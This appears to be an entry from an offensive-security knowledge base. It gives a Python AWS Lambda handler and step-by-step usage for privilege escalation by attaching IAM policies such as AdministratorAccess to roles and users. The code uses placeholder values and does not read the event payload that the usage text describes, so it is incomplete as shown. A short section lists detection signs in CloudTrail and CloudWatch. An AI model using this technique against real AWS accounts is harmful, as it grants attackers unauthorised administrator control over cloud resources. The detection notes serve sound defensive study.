---
id: 5e3b5ce7-fc3f-4bc3-a34d-5b55ad7b7276
name: AWS-Lambda-IAM-Policy-Attachment-Handler
type: code
language: Python
verified: true
created_at: '2023-04-06T03:56:12.006026+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - AWS
tags:
  - lambda
  - iam
  - privilege-escalation
validated: true
---

# AWS-Lambda-IAM-Policy-Attachment-Handler

## Code

```python
import boto3
import json

def handler(event,context):
    iam = boto3.client("iam")
    # Attach policy to role
    iam.attach_role_policy(
        RoleName="name",
        PolicyArn="arn",
    )
    # Attach policy to user
    iam.attach_user_policy(
        UserName="name",
        PolicyArn="arn",
    )
    return {
        'statusCode':200,
        'body':json.dumps("IAM Policy Attached Successfully")
    }
```

## Description

This Python Lambda handler function uses boto3 to attach a specified IAM policy to a target role and/or user. It is designed for privilege escalation by invoking the Lambda with an event containing the role name, user name, and policy ARN, allowing indirect policy attachment when direct permissions are lacking.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| RoleName | Name of the target IAM role | TargetAdminRole |
| PolicyArn | ARN of the policy to attach (for both role and user) | arn:aws:iam::aws:policy/AdministratorAccess |
| UserName | Name of the target IAM user (optional if not attaching to user) | TargetUser |

## Usage

Save as lambda_function.py, zip it, and upload to a Lambda function via AWS CLI. Invoke with a payload like {"role_name": "TargetRole", "policy_arn": "arn:aws:iam::aws:policy/AdministratorAccess", "user_name": "TargetUser"}. Modify the code to parse the event for dynamic values before calling attach_role_policy/attach_user_policy. Used in AWS privilege escalation after creating the Lambda with appropriate execution role.

## Detection

- CloudTrail logs showing Lambda invocations with IAM attach actions.
- Anomalous policy attachments from Lambda execution roles.
- Boto3 IAM client usage in Lambda logs (CloudWatch).

## Related

- [[procedures/AWS-Lambda-Function-Privilege-Escalation-via-IAM-Policy-Attachment]]
- [[tools/AWS-CLI]]
